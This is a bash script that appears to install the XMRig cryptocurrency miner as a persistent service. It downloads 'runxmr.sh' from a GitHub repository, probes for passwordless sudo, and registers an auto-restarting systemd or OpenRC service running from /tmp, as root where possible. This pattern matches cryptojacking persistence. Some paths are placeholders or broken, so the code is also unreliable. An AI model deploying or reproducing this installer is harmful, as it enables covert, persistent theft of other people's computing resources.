#!/bin/bash

xmrver="6.21.3"
SERVICE_NAME=xmrigservice
SERVICE_FILE=xmrigservice.service
OPENRC_SERVICE_FILE=xmrigservice

# Define the systemd service content
read -r -d '' SYSTEMD_SERVICE_CONTENT << EOM
[Unit]
Description=XMRig script service
After=network.target

[Service]
ExecStart=/tmp/xmrig/$xmrver
Restart=always

[Install]
WantedBy=multi-user.target
EOM

# Define the OpenRC service content
read -r -d '' OPENRC_SERVICE_CONTENT << EOM
#!/sbin/openrc-run
command="/path/to/your/executable"
description="My Service"
EOM

if command -v wget >/dev/null 2>&1; then
    DOWNLOAD_CMD="wget"
else
    DOWNLOAD_CMD="curl -O"
fi

$DOWNLOAD_CMD https://github.com/spetterman66/verynicerepo/raw/main/runxmr.sh

# Create the service file based on the init system
create_service_file() {
    if command -v systemctl &> /dev/null; then
        echo "Detected systemd. Creating systemd service file."
        echo "$SYSTEMD_SERVICE_CONTENT" > /tmp/$SERVICE_FILE
    elif command -v openrc &> /dev/null; then
        echo "Detected OpenRC. Creating OpenRC service file."
        echo "$OPENRC_SERVICE_CONTENT" > /tmp/$OPENRC_SERVICE_FILE
    else
        echo "Neither systemd nor OpenRC detected. Exiting."
        exit 1
    fi
}

# install service for systemd
install_systemd_service() {
    if sudo -n true 2>/dev/null; then
        echo "User has sudo privileges. Installing systemd service as root."
        sudo mv /tmp/$SERVICE_FILE /etc/systemd/system/
        sudo systemctl daemon-reload
        sudo systemctl enable $SERVICE_NAME
        sudo systemctl start $SERVICE_NAME
    else
        echo "User does not have sudo privileges. Installing systemd service as user."
        mkdir -p ~/.config/systemd/user/
        mv /tmp/$SERVICE_FILE ~/.config/systemd/user/
        systemctl --user daemon-reload
        systemctl --user enable $SERVICE_NAME
        systemctl --user start $SERVICE_NAME
    fi
}

# install service for OpenRC
install_openrc_service() {
    if sudo -n true 2>/dev/null; then
        echo "User has sudo privileges. Installing OpenRC service as root."
        sudo mv /tmp/$OPENRC_SERVICE_FILE /etc/init.d/$OPENRC_SERVICE_FILE
        sudo chmod +x /etc/init.d/$OPENRC_SERVICE_FILE
        sudo rc-update add $OPENRC_SERVICE_FILE default
        sudo rc-service $OPENRC_SERVICE_FILE start
    else
        echo "User does not have sudo privileges. OpenRC service installation requires root privileges."
        exit 1
    fi
}

# Main logic
create_service_file

if command -v systemctl &> /dev/null; then
    echo "Systemd detected!"
    install_systemd_service
elif command -v openrc &> /dev/null; then
    echo "OpenRC detected!"
    install_openrc_service
else
    echo "Neither systemd nor OpenRC detected. Exiting."
    exit 1
fi

echo "Service installation complete."